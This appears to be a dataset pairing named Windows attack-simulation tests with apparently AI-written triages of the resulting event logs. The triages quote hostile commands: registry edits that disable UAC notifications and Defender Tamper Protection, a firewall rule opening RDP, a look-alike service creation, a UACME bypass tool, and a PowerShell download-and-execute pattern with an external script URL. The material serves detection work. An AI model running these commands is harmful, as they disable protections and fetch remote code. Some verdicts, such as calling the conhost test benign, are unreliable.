     - Numerous events indicating Microsoft Edge auto-update actions. These process chains show legitimate system update behavior.

### Assessment:

- No clear indicators of compromise (IOC) or highly unorthodox behavior are readily apparent from these logs.
- Powershell logs are missing, which could typically highlight more issues if scripts were being executed maliciously.
- The activities, such as `whoami`, `cmd.exe`, and `wevtutil.exe` operations, are typical in environments with active administrative scripting or automated updates. The `edgeupdate` process activity suggests routine browser updates.

### Resolution: **BENIGN**
- The current logs reflect benign activities typical of regular system administration and auto-update processes for Microsoft Edge.

### Guidance on How to Proceed:
- Ensure that `LOCAL SERVICE` and administrative account activities align with expected patterns and schedules to mitigate the risk of disguised malicious activity.
- Since the PowerShell logs are empty, confirm whether PowerShell logging is appropriately configured for a comprehensive audit trail in future investigations.
- Maintain vigilance and conduct routine checks to establish baselines, which would assist in identifying anomalies quickly.
- If further assurance is needed, initiate a review of network activities corresponding with this timeline or other logs not initially provided.

Overall, while the logs do not present direct evidence of malicious activity, maintaining vigilant monitoring and regular review cycles is advisable."
Disable UAC notification via registry keys,"Upon reviewing the provided set of Windows event logs, here is the detailed analysis:

### Suspicious or Anomalous Behavior

1. **Registry Modification:**
   - One critical event in the Sysmon logs shows a command being executed with `cmd.exe` that modifies the Windows Registry:
     ```plaintext
     Command: ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f
     ```
   - This command disables User Account Control (UAC) notifications. Disabling UAC notifications is a well-known technique used by malware to avoid detection by users, allowing malicious actions to take place without alerting the user.

2. **Unusual Time Change Events:**
   - The Kernel-General and Security logs show events where there are frequent adjustments to the system time.
   - Time changes without clear business context or system patching could be used by attackers to evade time-based detection and logging mechanisms, although there is no direct evidence of exploitation here.

3. **Usage of System Utilities:**
   - The process executions involving tools like `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are logged under an account named `admin_test`.
   - These tools aren't necessarily malicious, but their execution context and timing could imply an attempt to manipulate event logs or capture system information surreptitiously.
   - However, we do not see additional suspicious indicators directly related to these executions within these logs.

4. **Process Integrity and Level:**
   - Most processes are shown running with high integrity levels or as `NT AUTHORITY\SYSTEM`, which is expected for critical system processes and updates but should still be monitored, especially when concerning other suspicious activities.

### Malicious Indicators

The most critical finding is the explicit registry manipulation that disables UAC notifications. This behavior is highly indicative of malicious activity or intent to compromise the system by elevating privileges or reducing user visibility into system changes.

### Guidance on How to Proceed

Given the identified registry modification and execution of potentially unwanted actions by a user account `admin_test`, there is significant cause for concern. Here’s a recommended course of action:

1. **Immediate Quarantine:** Isolate the affected host from the network to prevent further potential damage or lateral movement.
2. **Detailed Investigation:**
   - Perform a thorough investigation of the `admin_test` account activities – review recent logins and accessed resources.
   - Check for any abnormal logins or access patterns for the user accounts on Server002.
3. **Reverse the Registry Change:** If not already reversed, manually reset the UAC notification settings in the registry.
4. **Triaging and Scanning:** Use an antivirus or endpoint detection and response (EDR) solution to perform a comprehensive scan for additional signs of infection or tools left by the attacker.
5. **Review and Harden Security Policies:** Review and enhance security settings, especially around UAC, logging, and user permissions.

### Resolution

The final resolution for this investigation is:

- **MALICIOUS**: The presence of a command that disables UAC notifications is a direct indication of malicious intent aiming to subvert security features surreptitiously. Immediate action is needed to contain and remediate potential threats to this system and the broader network."
Indirect Command Execution - conhost.exe,"Upon reviewing the provided Windows event logs, here's an analysis of the activities and corresponding resolutions:

### Analysis
1. **Windows PowerShell Log**: The provided logs seem to be missing relevant PowerShell events. There are no entries indicating scripts or commands executed, which are often valuable in detecting malicious activities executed via PowerShell.

2. **Security Log**: 
   - Event IDs 4616 are seen, which relate to time changes. These entries, though common and can be benign, do also happen in scenarios where an attacker might try to evade detection or synchronize attack elements based on time. However, there's no direct evidence of malicious changes in this context.

3. **System Log**:
   - The Event ID 24 entries related to time adjustments seem normalized to system startup or change events, as indicated by standard timezone updates and time source configurations.

4. **Application Log**:
   - The presence of the ""edgeupdate"" service stopping does not inherently indicate dangerous activity as it can frequently occur under regular maintenance or automatic update settings.

5. **Sysmon Log**:
   - Several ""Sysmon"" Event IDs indicate quite routine process creation, such as `wevtutil.exe`, `cmd.exe`, `hostname.exe`, and system utilities like `whoami.exe` and `notepad.exe`. Specifically:
     - The execution of `cmd.exe` with arguments indicating the spawning of `conhost.exe` and `notepad.exe`. While benign in many scenarios, these could signal process hollowing techniques in certain attack types if seen with additional malicious indicators which are not evident here.
     - Repeated instances of Microsoft Edge Update-related processes, such as `MicrosoftEdgeUpdate.exe`, are observed, possibly indicating either a scheduled or manual update process, typical in maintaining browser and related software.

### Conclusion: BENIGN

**Resolution: BENIGN** - The logs reviewed do not contain indicators of compromise or malicious activities. The entries observed are consistent with routine system maintenance, software updates (particularly related to Microsoft Edge), and typical kernel-level time synchronization tasks. If this system falls under scrutiny beyond this log capture scope, continuing to monitor for other artifacts or correlating logs with other systems may be warranted to provide thorough vigilance. However, based on the evidence provided here, no malicious activity can be assuredly concluded."
Activate Windows NoRun Group Policy Feature,"Upon reviewing the logs provided, let us examine potential indicators of suspicious or malicious activity:

1. **Sysmon Events:**
   - The use of `whoami.exe`, `hostname.exe`, and `cmd.exe` in succession without obvious purpose is noteworthy. However, these utilities are commonly used in various administrative tasks.
   - The execution of `cmd.exe` with a command to edit the registry (`reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f`) is suspicious. This specific registry modification can prevent users from accessing certain features, which could be used as a part of a persistence mechanism or to impede user capabilities.
   - The presence of `wevtutil.exe` commands could suggest an attempt to alter or query event logs, but no explicit command details are provided. This warrants further inspection.

2. **Suspicious Command Line:**
   - The registry modification command is generally not common in routine operations without a specific operational need and most often seen in scripts or administrative adjustments.
   - Because the command was executed under the user context `SERVER002\admin_test`, it suggests intentional execution by a user with administrative privileges or using a tool/script that impersonates the user.

3. **Scheduled Software Update:**
   - The appearance of `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and associated processes relates to software updates for Microsoft Edge, which is benign and expected behavior for updates.

4. **Time Change Events:**
   - Observations of time changes (security and system logs) due to `svchost.exe` managing time synchronization with an NTP server (`time.windows.com`) appears legitimate and is routinely seen in environments to maintain system time accuracy.

### Assessment:

- **Potential Suspicious Activity:**
  - The registry change is the primary indicator that raises concern. Registry modifications, especially those that alter user capabilities or system configurations, can be a tactic used in persistence mechanisms.

### Conclusion:

- **Resolution: SUSPICIOUS**
  - While most of the activities appear benign, the specific registry modification requires further investigation. It is important to determine the context around the `cmd.exe` execution that made these modifications, identify who initiated these actions (consideration for potential misuse of an admin account), and verify if this action aligns with any scheduled or legitimate administrative activity.

### Recommendations:

- **Investigate the Origin:**
  - Verify if the change in registry policies has been documented or verified as part of a legitimate administrative action.
  - Cross-reference with network logs to see if this corresponds to remote administrative actions.

- **Review Security Practices:**
  - Ensure robust monitoring is in place to alert on unauthorized privileged user actions.
  - Regularly review user accounts and privileges, especially for those with administrative access.

- **Monitor for Persistence:**
  - Conduct a thorough review of scheduled tasks, startup items, and other potential persistence mechanisms on the host.

By following the recommendations and conducting further investigation, you can clarify the context and validity of the suspicious modifications."
Creating W32Time similar named service using sc,"### Analysis Summary

After conducting a thorough analysis of the given logs, there's one primary area of concern that stands out which could potentially indicate malicious activity. Let’s review the potentially suspicious activities identified in the logs:

#### 1. Suspicious Service Creation:

- **Event Time**: `2024-10-21 13:33:29`
- **Event ID**: 7045 (System Log)
- **Details**: There is a creation of a Windows service named `win32times` with the command `cmd /c start c:\data.004_NonExistingScript.ps1.` The service is created by an account with high privileges (`LocalSystem`).

This behavior is suspicious for the following reasons:
- **Service Name**: `win32times` doesn’t align with standard Windows service naming conventions, and there isn't a well-known service by this name.
- **Command**: The service attempts to execute a non-existent script (`data.004_NonExistingScript.ps1`), indicating a possible attempt to execute a malicious PowerShell script.
- **Privileges**: The service is running under the LocalSystem account, which has high level administrative privileges, often leveraged by attackers to maximize their level of compromise.
  
#### 2. System Command Execution:

- **Event Time**: `2024-10-21 13:33:29`
- **Sysmon Event ID**: 1
- **Details**: The `cmd.exe` was observed executing a system command that matches the service creation: `""cmd.exe"" /c sc create win32times binPath= ""cmd /c start c:\data.004_NonExistingScript.ps1"" & sc qc win32times`.

This execution further correlates and confirms the service creation event. The use of command-line to execute such a script within a service context is often used in attacks for persistence or lateral movement.

#### 3. Other Entries:

- **Windows Update Events**: Normal behavior indicating update checks and possible installations, such as `WUauClt.exe` and `MpSigStub.exe` activities for updating antivirus definitions.
- **Microsoft Edge Update process**: Regular behavior observed.
- **Security Logs**: 5379 events correspond to Key Credential Retrieval failures, which appear as benign unsuccessful authentication events.

### Conclusion

While most of the activities regarding Windows Update and standard system processes appear benign, the creation and execution of a suspicious Windows service do not align with typical benign activity. This suspicious action could indicate an attempted compromise or pending malicious intent, potentially including attempts to gain persistence.

**Resolution: SUSPICIOUS**

The identified activities should be investigated further to rule out potential malicious intent. This includes:
- Verifying the origin and intent of the service creation.
- Identifying if any related suspicious file appeared or disappeared around the same time.
- Analyzing network activities around the same timestamp.
- Checking for any similar past activities for pattern identification.

Following these checks should help ascertain whether it is a legitimate administrative action or an attempt at compromising the system."
Open a local port through Windows Firewall to any profile,"## Detailed Analysis of Logs

### Suspicious or Anomalous Behavior

1. **PowerShell Execution**: There is a notable execution of PowerShell with a command to add a firewall rule: 
   - `powershell.exe & {netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any}`
   - This action is suspicious as it attempts to open port 3389, commonly associated with Remote Desktop Protocol (RDP), which could be used for remote access by an unauthorized entity.

2. **Process Chain and High Integrity Levels**: 
   - Several processes, notably PowerShell and `netsh.exe`, operate under a high integrity level, suggesting elevated privileges.
   - They are executed with command lines indicative of network configuration changes which are usually performed using elevated permissions.

3. **Proliferation of System Utility Executions**:
   - Utility executions such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` appear in rapid succession. While not inherently malicious, the context and frequency raise suspicion, especially when conducted by the same user account (`SERVER002\admin_test`).

### Malicious Indicators

1. **Use of PowerShell for Firewall Rule Change**:
   - PowerShell script execution to alter firewall settings is alarming, particularly given the rule opens external access to the internal network on an important RDP port.
   
2. **Temporal Correlation and Frequencies**:
   - The rapid succession and frequency of command executions indicate potential automation or scripted activity, characteristic of an attempt to create persistence or lateral movements within a network.

### Assessment

Based on the analysis:

- **Contextual Risk**: The execution of PowerShell with the intent of opening a firewall port for RDP access is a high-risk activity, potentially indicative of an attempt to facilitate unauthorized remote access.
- **User Account Activity**: The `admin_test` account's high-privilege actions and frequency of system-level operations are anomalous, suggestive of misuse or potential compromise of credentials.
  
### Conclusion: **MALICIOUS**

The combination of:
- High-integrity level execution of system commands.
- An attempt to open remote ports through PowerShell.
- Use of a pattern consistent with malicious scripts or administrator account abuse.

All strongly indicate potential malicious activity.

### Recommended Actions

1. **Immediate Network Segmentation**: Isolate the affected host (`Server002`) from the network to prevent further unauthorized access or data exfiltration.
2. **Credential Revocation**: Change all potential compromised credentials, especially `admin_test`.
3. **In-Depth Forensics**:
   - Investigate the logs further to ascertain the origin and scope of the PowerShell script.
   - Examine other systems for similar patterns.
4. **Containment and Monitoring**: Reinforce monitoring on all entry and exit points, especially RDP-related activities.

Engage incident response to handle containment and remediation efforts promptly."
Abusing Windows TelemetryController Registry Key for Persistence,"Upon analyzing the provided log entries, I have identified the following key activities and observations:

1. **Repeated Execution of Windows System Processes:**
   - The logs show frequent execution of typical Windows system processes, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`, all by the user `SERVER002\\admin_test`. These processes, by themselves, are standard Windows utilities. However, frequent or automated execution might suggest script-based activity or task automation. 
   - In particular, `wevtutil.exe` is a command-line utility for managing event logs and `conhost.exe` is a helper process for command-line tasks. Their increased activity, potentially spawning in quick succession, suggests automated log querying or script execution.

2. **Registry Modification with `cmd.exe`:**
   - There is an instance where `cmd.exe` is executed to create a registry key associated with `TelemetryController` to execute `C:\\Windows\\System32\\notepad.exe`. While this specific command doesn't necessarily pose an immediate threat, unauthorized or unexplained registry modifications, especially those that cause software to launch unexpectedly, could be a vector for persistence or espionage.

3. **Execution of Windows Installer and Update Processes:**
   - Multiple processes related to Microsoft Edge Update were noted (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`). The processes are generally associated with legitimate software updates, yet they are executed many times over a short span which may be legitimate background activity or an anomaly depending on typical behavior.

4. **Use of High Integrity Levels:**
   - Processes like `cmd.exe` and `reg.exe` were executed with a high integrity level, indicating elevated privileges. While normal for some administrative tasks, if unexpected, this could point to a privilege escalation attempt.

5. **Other System Processes:**
   - Processes such as `sppsvc.exe` (a Windows licensing and protection service) and `TiWorker.exe` (related to Windows updates) seem to be running normally under trusted authority accounts. These operations are standard during system maintenance periods.

**Assessment:**
- Based on the above analysis, there's no definitive indicator of compromise (IOC) that explicitly shows malicious activity. The activities observed may be associated with regular administrative or maintenance operations. However, the registry modification and repeated execution of certain utilities merit a closer inspection depending on the known typical activity of the server in question.

**Resolution:**
- **SUSPICIOUS**: The logs contain activities that don't immediately explainable given their repetition and potential for abuse (like registry modifications). It is advisable to conduct further investigation on:
  - The intent and origin of the registry modification.
  - The context and necessity of frequent process executions, particularly those with high integrity levels.
  - Verification that Microsoft Edge Update processes align with scheduled or expected update behavior for this environment.

A proactive step would be to monitor this system closely for any further anomalies and verify these activities align with expected operational or administrative tasks on `Server002`."
UACME Bypass Method 56,"### Detailed Analysis

Upon reviewing the provided Windows event logs, several indicators and patterns emerge that warrant closer inspection.

1. **Suspicious Command Execution**: 
   - **Sysmon Event ID 1** documents the execution of `cmd.exe` with a suspicious command line: 
     ```plaintext
     ""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\56 Akagi64.exe
     ```
     - The command line references the `uacme` project, which is an open-source software known for demonstrating User Account Control (UAC) bypass techniques. Specifically, `Akagi64.exe` is commonly associated with UAC bypass attempts.
   - Another `cmd.exe` entry follows shortly:
     ```plaintext
     ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\56 Akagi64.exe""
     ```

2. **High Integrity Level**: 
   - The `IntegrityLevel` for these processes is marked as `High`, indicating elevated privileges that are typical in scenarios involving privilege escalation attempts.

3. **Process Relationships**:
   - Processes like `wevtutil.exe` and `conhost.exe` are frequently spawned with the `SERVER002\\admin_test` user context, originating from suspicious command line operations.

4. **Consistent User Context**:
   - Most of the processes, particularly those involved in potentially suspicious activities, are executed by the `SERVER002\\admin_test` account.

5. **Potential Edge Exploitation**:
   - Multiple executions of `MicrosoftEdgeUpdate.exe` in various directories (`Temp` and regular update directories) could indicate either a legitimate update operation or potential exploitation of the Edge update mechanism for lateral movement or privilege escalation.

6. **Security Tool State**:
   - The application log indicates that Windows Defender's security state remains ""ON"", suggesting no immediate known malware was detected by the local security tool.

### Assessment

- **Suspicious Indicators**:
  - The presence and execution of a known UAC bypass tool (`Akagi64.exe`) in the context of elevated privileges.
  - Routine invocations of command line and system utility tools such as `wevtutil.exe`, `conhost.exe` with potentially unnecessary operations.
  - Although EdgeUpdate processes are legitimate, their high frequency and execution from a `Temp` directory require deeper investigation to rule out abuse scenarios.

### Resolution

Given these observations, the situation is assessed as:

- **SUSPICIOUS**: While conclusive evidence of a definite malicious activity is not present, the repeated execution of a UAC bypass tool and associated suspicious process spawning are concerning enough to warrant further investigation.

### Guidance on How to Proceed

1. **Immediate Actions**: 
   - Terminate suspicious processes, especially any running instances of `Akagi64.exe`.
   
2. **Investigate**: 
   - Retrieve and analyze the file `56 Akagi64.exe` from the specified directory for any malicious content.
   - Conduct a deep dive into the `SERVER002\\admin_test` user's activities and permissions.
   
3. **Security Hardening**:
   - Ensure UAC is configured to most stringent settings.
   - Enhance monitoring on `cmd.exe`, `powershell.exe`, and any process invocation related to system utilities like `wevtutil.exe`.
   
4. **Review Network and Endpoint Security**:
   - Implement additional layers of threat detection that can detect abnormal patterns related to Edge updates.
   - Consider performing a full malware scan across the system and the network segment where this server resides.

5. **Further Monitoring**:
   - Continue to monitor for repeat patterns or other indicators of potential privilege escalation attempts or internal reconnaissance."
Tamper Win Defender Protection,"In examining the provided Windows event logs, I've identified several points of interest:

1. **Time Change Events:**
   - The Security and System logs record multiple instances of EventID 4616 and respective Kernel-General logs with EventID 1 and 24, indicating changes to system time. Adjustments to system time can sometimes indicate an attempt to cover tracks of malicious activities, but in this context, these logs show very slight adjustments and use standard processes (`svchost.exe`). This behavior, while worth noting, doesn't immediately suggest malicious intent but requires verification against organizational policies regarding time changes.

2. **Commands Executed:**
   - Sysmon logs show a `cmd.exe` process executing a command to modify the Windows Defender Tamper Protection setting, specifically turning it off:
     ``` 
     ""CommandLine"":""\""cmd.exe\"" /c reg add \""HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f""
     ```
   - Turning off Tamper Protection without an admin's directive is suspicious. This behavior is often associated with attackers trying to disable security features to facilitate further compromise or persistence.

3. **Tool Usage:**
   - Regular executions of `wevtutil.exe` and `conhost.exe` by `admin_test` user. 
   - Use of administrative commands and tools such as `wevtutil` can indicate log clearance attempts if no legitimate reason for their execution is provided, especially in a tight timeframe.

4. **Microsoft Edge Update Activity:**
   - There are multiple Sysmon events related to Microsoft Edge Update processes, indicating an update or installation was in process. This activity, while aggressive in its frequency, aligns with known behavior of legitimate software updates and typically runs under SYSTEM context. No immediate malicious indicators are present here, but an unusually frequent update process can be a sign of misconfiguration or could be leveraged in a supply chain attack.

### Assessment:

- **BENIGN:** The time change adjustments are minor and involve standard processes, suggesting routine operations unless further context indicates otherwise.
- **SUSPICIOUS:** The command executed by `cmd.exe` to modify the Tamper Protection setting on Windows Defender is a significant red flag, warranting further investigation into who or what initiated this action.
- **BENIGN:** The Edge Update activities, on review, are akin to a software patch cycle and do not display malicious characteristics, though ensuring these updates are legitimate is prudent.

### Resolution:
- **Resolution:** **SUSPICIOUS**
- **Guidance on how to proceed:**
  - Investigate the origin of the command that adjusted the Tamper Protection setting. Verify if it was initiated by an authorized script or personnel.
  - Review recent changes or access to the administrative account `admin_test`, especially if no legitimate administrator activities were planned.
  - Monitor for any repeat or similar suspicious actions and enhance alerting for sensitive registry tampering.
  - Ensure software updates, especially for Microsoft Edge, are from legitimate sources by checking file signatures and integrity."
Control Panel Items,"After reviewing the provided event logs, I have identified several points of interest and potential indicators of malicious activity:

1. **Unusual Use of 'rundll32.exe' and '.cpl' Files:**
   - The logs indicate the execution of 'rundll32.exe' with a '.cpl' file from a user's AppData Temp directory (`""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\calc.cpl""`). This might be suspicious because adversaries often leverage both 'rundll32.exe' and '.cpl' files for malicious activities. The common usage for a '.cpl' file is to execute control panel items, but in this context, it appears to execute a calculator application indirectly through several layers.

2. **Process Execution Chain:**
   - The process chain starting from `cmd.exe` which triggers control panel execution through `control.exe` and `rundll32.exe`, then ultimately executes the calculator, could signify a suspicious behavior that needs closer inspection. This chain of command execution from temporary directories can be utilized for bypassing security controls and launching unwanted processes.

3. **Use of Windows System Binary (`whoami.exe`, `cmd.exe`, `calc.exe`):**
   - System-level processes (like `whoami.exe`) and executions from the Windows directory frequently seen in:
     - Verification of user and system integrity.
     - Legitimate scheduled tasks. However, combining these activities with temporary folder execution might indicate tampering or persistent foothold attempts.

4. **Microsoft Edge Update Activity:**
   - Multiple instances of Microsoft Edge Update-related activities are recorded with frequent process creation and service activity. Generally, this may be normal for update processes, but any anomaly in file path or command line arguments should be considered, especially if processes run from non-standard directories, like temporary folders.

**Assessment:**
- **SUSPICIOUS**: The entanglement of `cmd.exe`, `control.exe`, and `rundll32.exe`, especially executing from the temporary folder with a `.cpl` file, alongside obfuscated directory naming, is critically suspicious. This warrants further investigation to ensure no malicious payloads are attempting to masquerade as legitimate operations. The presence of these actions could suggest possible unauthorized software executions, or prepare an environment for exploitation.

**Guidance:**
- Conduct deep scanning for malware signatures, especially those associated with the calculator program and corresponding temp directories.
- Inspect the system for any persistence mechanisms that could occur due to successful 'rundll32' exploitation.
- Review logs for any similar redundant execution patterns across other user profiles or systems.
- Verify the legitimacy of Microsoft Edge Update activities and check if these arise from recognized update schedules or known origins.
- Check for security patches or whitelisting policies to mitigate any similar occurrences in the future."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided event logs, here are the observations and findings regarding suspicious activities, indicators of compromise, and associated concerns:

#### Suspicious or Anomalous Behavior:
1. **PowerShell Execution**: There is an execution of PowerShell with the command line involving `Invoke-CimMethod` to install a package from an unusual directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_EXE.msi`). Commands executed via PowerShell that reference temporary directories can be indicative of suspicious behavior, particularly if they involve script execution or installation operations.

2. **Use of `wevtutil.exe` and `conhost.exe`**: There are multiple instances of `wevtutil.exe` and `conhost.exe` running. While `conhost.exe` is the Console Window Host, which can run alongside legitimate operations, excessive or coordinated execution might suggest attempts to manipulate or hide command-line activities. `wevtutil.exe` is used for querying and managing event logs, which could be leveraged for log tampering or forensics evasion in some attacks.

3. **Temporary MSI Execution**: The use of MSI packages from temporary directories by installer applications (e.g., `msiexec.exe`) is captured in the logs. The log shows ""Installation completed successfully,"" raising questions about the legitimacy of this software.

4. **Edge Update Activities**: There is considerable activity from Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`), involving various commands like `/svc`, `/update`, `/regsvc`, and `/regserver`. While these could be legitimate update processes, the recurrence and diversity of the commands in a short period warrant closer scrutiny, especially if they were unexpected or unauthorized.

#### Indications of Malicious Activity or Compromise:
- The suspicious PowerShell command involving the MSI package from a temporary directory could represent a legitimate software installation or an attempt to deploy unauthorized or malicious software. Malicious actors often exploit temporary folders for execution to avoid detection.
- Unusually high activity from system utility tools (`wevtutil.exe`, `conhost.exe`) correlated with temporary installations might suggest potential lateral movement or privilege escalation activities.

### Assessment and Resolution:
Based on the analysis of the Windows event logs, the combination of PowerShell execution from a temporary directory, temporary MSI installation, and extensive usage of `wevtutil.exe` and `conhost.exe` tasks, it would be prudent to treat these activities as suspicious.

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Perform a Detailed Investigation**:
   - Verify the legitimacy of the PowerShell command and the MSI package installation against software deployment records.
   - Investigate the use of `wevtutil.exe` commands and correlate with user actions or scheduled tasks for legitimacy.

2. **Review User and Permission Logs**:
   - Check for recent privilege escalations or changes in user access that could correlate with observed behaviors.

3. **Check for Indicators of Compromise**: 
   - Scan the involved systems for known vulnerabilities or persistence mechanisms exploiting PowerShell or temporary directory execution.

4. **Enterprise Endpoint Monitoring**:
   - Implement or review existing endpoint monitoring for enhanced detection of similar activities, focusing on PowerShell script execution and unexpected MSI file installations.

5. **Threat Intelligence Correlation**:
   - Cross-reference with recent threat intelligence reports to identify any known campaigns or tactics using similar techniques or file hashes.

This approach will help clarify the nature of the identified activities and determine whether they signify a real threat or can be attributed to legitimate system maintenance or user behavior."
Disable Windows Toast Notifications,"Upon reviewing the provided Windows event logs, here is the detailed analysis of any suspicious or anomalous behavior that was observed:

1. **Time Change Events:**
   - In the System log, there are several events related to time changes (`EventID: 1` and `EventID: 24` from `Microsoft-Windows-Kernel-General`). Both occur at the same timestamps within milliseconds apart, which are routine time synchronization adjustments likely synchronized with `time.windows.com` (as per `EventID: 35` from `Microsoft-Windows-Time-Service`). This seems to be a normal NTP time synchronization process, which isn’t suspicious on its own.

2. **Sysmon Logs:**
   - There are various `Sysmon` events indicating the execution of common legitimate processes such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, and `reg.exe`. 
   - A critical suspicious finding is the execution of `cmd.exe` with the `reg add` command to modify registry keys under the current user for disabling toast notifications (`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f`). This could indicate an attempt to suppress notifications potentially as part of hiding malicious activities. This action typically needs further investigation since unauthorized or unchecked registry modifications can imply malicious intent.
   - The processes `wsmprovhost.exe` and `cmd.exe` are noted as parent processes for some executed commands, which aren’t inherently malicious; however, in combination with registry modification, can raise red flags.

3. **Application Log:**
   - Contains a standard event from the `Microsoft-Windows-Security-SPP` related to the Software Protection Platform Service. There’s no apparent suspicious activity here.

### Assessment:
- The observed `cmd.exe` with `reg add` command to alter registry settings stands out as the most suspicious activity within these logs. This behavior could be associated with attempts to modify system settings quietly, which normally doesn’t happen without user consent or as part of sanctioned scripts/policies.

### Recommendation & Resolution:
- **Resolution: SUSPICIOUS**

This activity necessitates a deeper investigation to determine if this modification was part of a legitimate IT administrative task or if it was executed by an unauthorized user or process. It is recommended to:
- Check for recent changes in user access permissions or administrative rights especially for the `admin_test` user.
- Review any recent deployments or scripts that might have this command embedded as part of legitimate maintenance.
- Monitor the user account `admin_test` for unusual behavior or access patterns.
- Investigate corresponding EDR, antivirus alerts, or IDS logs for any other indicative activities around the same timeframe.

Ensure system integrity by rolling back the registry change if confirmed unauthorized, and conduct broader threat hunting for any other anomalies tied to this timeframe or user."
Obfuscated Command in PowerShell,"**Detailed Analysis:**

1. **System Log Evaluation:**
   - The logs primarily involve time synchronization events using ""time.windows.com"" as the source, which is a standard operation for systems to ensure accurate time settings. 
   - There are Windows Update events related to Security Intelligence Updates for Microsoft Defender Antivirus. Both the initiation and completion of the update process are captured. This is usual behavior and suggests the system is updating its security definitions.

2. **Windows PowerShell Log Evaluation:**
   - A set of complex, obfuscated PowerShell commands are logged. This is suspicious as obfuscation is commonly used to conceal malicious intent or operations. The command includes string manipulation and character conversion, which implies an attempt to execute encoded instructions, possibly indicating malicious activity or potential compromise.

3. **Security Log Evaluation:**
   - There are several security auditing events regarding time changes. However, they coincide with the time synchronization activity seen in the System Logs and do not indicate malicious intent.
   - The EventID 5379 indicates failures related to retrieving credential information via Microsoft accounts or services. The recurring unsuccessful attempts, marked by consistent `ReturnValue: 3221226021`, might indicate system or network misconfiguration but do not clearly suggest malicious actions.

4. **Sysmon Log Evaluation:**
   - Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and PowerShell instances invoked by the user ""SERVER002\admin_test"" are seen. The frequent and varied use of these utilities suggests potential enumeration activities, commonly associated with reconnaissance or system exploration by unauthorized parties.
   - The presence of obfuscated PowerShell command execution, as reflected in the ProcessID for PowerShell, further raises suspicion.

**Assessment:**

The presence of obfuscated PowerShell commands, combined with Sysmon logs showing enumeration and system utilities usage, suggest possibly malicious activity or at least behavior that warrants further investigation. While some logs might be benign and related to regular system maintenance, the PowerShell usage is atypical and points towards potential threats.

**Threats or Risks Identified:**
- The use of obfuscated PowerShell commands is a strong indicator of possible adversary operation within the network.
- System enumeration via native utilities could be a precursor to privilege escalation, lateral movement, or deeper infiltration.

**Guidance on How to Proceed:**
1. **Immediate Steps:**
   - Quarantine the affected system to prevent any potential spread of malicious activities.
   - Conduct a memory dump and full disk forensic analysis to identify further evidence of compromise or malicious payloads.

2. **Long-Term Actions:**
   - Review and strengthen PowerShell logging policies to ensure commands are recorded for more granular analysis.
   - Conduct a thorough security audit of user privileges and application whitelisting to minimize exposure.
   - Improve defenses against obfuscated and malicious script execution by employing advanced threat detection solutions.

**Resolution: SUSPICIOUS**
- Although concrete evidence pointing to a definitive attack (labeled as MALICIOUS) is not found, the obfuscated PowerShell activity is atypical and poses sufficient risk to warrant further investigation."
WinPwn - UAC Bypass DccwBypassUAC technique,"Upon analyzing the provided event logs from various Windows log sources, several key observations have been made:

### Overview of Logs Analyzed:
1. **System Log** - Kernel time change events indicate the service changing system time.
2. **Security Log** - Auditing events reflect system time changes without any anomalies in credentials.
3. **Windows PowerShell Log** - A series of entries shows that a PowerShell command is attempting to download a script from an external website.
4. **Sysmon Log** - The logs track command-line activities and process creations.
5. **Application Log** - Software Protection Platform and Security Center events appear usual in recorded entries.

### Indicators of Malicious Activity:
- **PowerShell Execution**:
  - Observed commands starting PowerShell using `iex(new-object net.webclient).downloadstring(...)`, which downloads and potentially executes a script remotely, is a recognized method frequently exploited in attacks, often termed as “living off the land binaries and scripts” (LOLBAS).
  - The URL provided in the PowerShell log (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1`) potentially points to an obfuscated script that might escalate privileges or perform unauthorized actions.

### Normal System Activities:
- **Process Execution**:
  - The execution of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `svchost.exe` by the user `SERVER002\admin_test` shows typical administrative behavior, with `whoami.exe` being commonly used for checking user identity.
- **Security and System Auditing**:
  - Security audits reflect expected outputs for system time changes and do not resemble attempts for privilege abuse or unauthorized actions.

### Assessment and Resolution:
Given the analysis above, there is compelling evidence suggesting a potentially malicious activity due to the execution of a PowerShell command that seems to fetch and execute a script from an unverified external source. This aligns with common tactics used in various cyber-attacks, especially for deploying payloads that can lead to privilege escalation or remote code execution.

Therefore, considering the downloaded script from an untrusted source using PowerShell and the typical indications of malicious PowerShell activity, I conclude:

### Resolution: MALICIOUS
- **Immediate Action Items**:
  - Investigate the downloaded script by retrieving and reviewing its content to understand the intention and impact.
  - Identify the initiating point or account access that triggered this activity.
  - Isolate the affected system to prevent lateral movement or further exploitation.
  - Follow through with comprehensive endpoint protection and an internal audit for similar activities across the network. 

- **Preventive Measures**:
  - Implement strict PowerShell execution policies and logging.
  - Enhance the monitoring capabilities to detect and respond to suspicious script execution.
  - Educate staff on the risks of executing scripts from unknown sources.

